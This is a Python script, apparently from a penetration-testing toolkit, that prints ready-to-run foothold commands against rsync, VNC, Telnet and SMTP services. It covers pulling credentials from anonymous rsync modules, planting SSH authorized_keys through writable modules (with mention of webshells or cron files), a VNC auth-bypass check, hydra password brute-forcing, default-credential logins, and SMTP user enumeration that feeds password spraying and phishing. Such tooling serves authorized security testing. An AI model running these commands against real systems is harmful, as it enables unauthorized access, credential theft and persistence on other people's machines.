#!/usr/bin/env python3
"""MISC remote-service footholds — rsync · VNC · Telnet · SMTP. PRINTS commands. Edit LHOST in _services_common.py.

Usage:
  python3 gen_remote.py rsync  --target 10.0.0.5
  python3 gen_remote.py vnc    --target 10.0.0.5
  python3 gen_remote.py telnet --target 10.0.0.5
  python3 gen_remote.py smtp   --target 10.0.0.5 [--users users.txt]
"""
import sys
import _services_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "rsync"
t   = opt("--target", "<target>")

if arg == "rsync":
    print(f"# rsync (873) — anonymous modules -> read/write the filesystem:")
    print(f"# needs: an anonymous (auth-free) rsync module; the write path also needs that module to be WRITABLE.")
    print(f"rsync rsync://{t}/                       # list modules")
    print(f"#   -> ok: one or more module names print (no auth prompt) = anonymous rsync is exposed")
    print(f"rsync -av rsync://{t}/<module>/ loot/    # pull (creds/keys/configs)")
    print(f"#   -> ok: files transfer into loot/ = <module> is readable")
    print(f"# WRITABLE module mapped to a home/webroot -> foothold:")
    print(f"ssh-keygen -f k -N ''; echo 'ssh-... k.pub' > authorized_keys")
    print(f"rsync -av authorized_keys rsync://{t}/<module>/.ssh/    # then ssh -i k <user>@{t}")
    print(f"#   -> ok: the upload completes (no 'permission denied') = <module> is writable")
    print(f"#   or push a webshell / a cron file, depending on what the module points at.")

elif arg == "vnc":
    print(f"# VNC (5900+) — no-auth or weak password -> GUI session:")
    print(f"# needs: a VNC server with no auth, a weak/crackable password, or a version vulnerable to the bypass CVE.")
    print(f"# order: no-auth connect first (nmap flags it), then the auth-bypass CVE, then a password brute (slow/noisy, last).")
    print(f"nmap --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 {t}")
    print(f"#   -> ok: nmap reports 'Security types: None' (or the bypass script = VULNERABLE) = you can connect")
    print(f"vncviewer {t}:5900                       # no-auth -> straight in")
    print(f"#   -> ok: a desktop appears with no password prompt = no-auth session")
    print(f"# weak password:  hydra -P /usr/share/wordlists/rockyou.txt vnc://{t}")
    print(f"# CVE-2006-2369 (RealVNC 4.1.1 auth bypass) via the nmap script above. -> then act as the logged-in user.")

elif arg == "telnet":
    print(f"# Telnet (23) — default/weak creds (common on IoT/appliances/legacy):")
    print(f"# needs: Telnet open on 23 + default/weak creds (put candidates in <users.txt> / <passes.txt>).")
    print(f"telnet {t}                               # try admin:admin, root:root, vendor defaults")
    print(f"#   -> ok: you reach a shell/device prompt after a login = the creds are accepted")
    print(f"nxc telnet {t} -u users.txt -p passes.txt 2>/dev/null || hydra -L users.txt -P passes.txt telnet://{t}")
    print(f"#   -> ok: a '[+]' / 'login: password:' success line = a valid user:pass pair was found")
    print(f"# banner often names the device -> look up vendor default creds.")

elif arg == "smtp":
    users = opt("--users", "users.txt")
    print(f"# SMTP (25) — user enumeration + open relay (not a shell, but feeds spray/phishing recon):")
    print(f"# needs: SMTP open on 25 + a candidate list in <users.txt>; enum works only if VRFY/EXPN/RCPT aren't disabled.")
    print(f"smtp-user-enum -M RCPT -U {users} -t {t}       # or -M VRFY / -M EXPN")
    print(f"#   -> ok: lines marked 'exists' = those usernames are valid on the server")
    print(f"nmap --script smtp-open-relay,smtp-commands,smtp-enum-users -p 25 {t}")
    print(f"# valid users -> ../network/gen_spray.py (spray them).  Open relay = a separate finding.")
else:
    print("use: rsync | vnc | telnet | smtp"); sys.exit(1)
